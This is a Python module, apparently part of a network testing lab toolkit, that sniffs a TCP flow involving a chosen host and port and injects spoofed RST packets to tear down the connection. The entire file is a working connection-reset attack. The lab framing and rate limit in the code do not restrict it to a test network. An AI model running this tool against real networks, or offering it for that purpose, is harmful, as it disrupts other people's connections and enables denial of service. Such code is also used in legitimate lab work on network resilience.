"""Inject TCP RST packets to tear down a connection in the lab."""

from __future__ import annotations

import time
from typing import Any

from scapy.all import IP, TCP, conf, send, sniff  # type: ignore

from netlab.base import BaseModule, ModuleParam


class TcpReset(BaseModule):
    name = "tcp_reset"
    description = "Sniff a TCP flow and inject RST segments"
    category = "l3_l4"

    @classmethod
    def parameters(cls) -> list[ModuleParam]:
        return [
            ModuleParam(name="target", type="ip", label="Host in the flow", required=True),
            ModuleParam(
                name="port",
                type="int",
                label="Port filter",
                required=False,
                default=0,
                description="0 = any TCP port",
            ),
            ModuleParam(name="interface", type="interface", label="Interface", required=False,
                default=None),
            ModuleParam(
                name="duration",
                type="int",
                label="Duration (seconds)",
                required=False,
                default=30,
            ),
            ModuleParam(
                name="rate_limit_pps",
                type="int",
                label="Rate limit (pps)",
                required=False,
                default=20,
            ),
        ]

    def run(self, params: dict[str, Any], logger: Any, rate_limiter: Any) -> None:
        target = params["target"]
        port = int(params.get("port") or 0)
        iface = params["interface"]
        duration = int(params.get("duration", 30))
        conf.iface = iface
        conf.verb = 0
        bpf = f"tcp and host {target}"
        if port:
            bpf += f" and port {port}"
        start = time.time()
        print(f"[tcp_reset] {bpf} on {iface} for {duration}s")

        def handle(pkt) -> None:
            if self.should_stop() or not pkt.haslayer(TCP) or not pkt.haslayer(IP):
                return
            tcp = pkt[TCP]
            if tcp.flags & 0x04:  # already RST
                return
            # ACK the data we just saw and reset that direction's peer.
            seq = int(tcp.ack) if tcp.flags & 0x10 else int(tcp.seq)
            rst = IP(src=pkt[IP].dst, dst=pkt[IP].src) / TCP(
                sport=tcp.dport,
                dport=tcp.sport,
                flags="R",
                seq=seq,
            )
            rate_limiter.wait()
            send(rst, verbose=0)
            logger.add_packets(1, len(bytes(rst)))
            print(f"  RST {pkt[IP].dst}:{tcp.dport} -> {pkt[IP].src}:{tcp.sport}")

        try:
            sniff(
                iface=iface,
                filter=bpf,
                prn=handle,
                store=0,
                timeout=duration if duration > 0 else None,
                stop_filter=lambda _: self.should_stop()
                or (duration > 0 and (time.time() - start) >= duration),
            )
        except KeyboardInterrupt:
            print("\n[tcp_reset] Interrupted")
        print("[tcp_reset] Done")
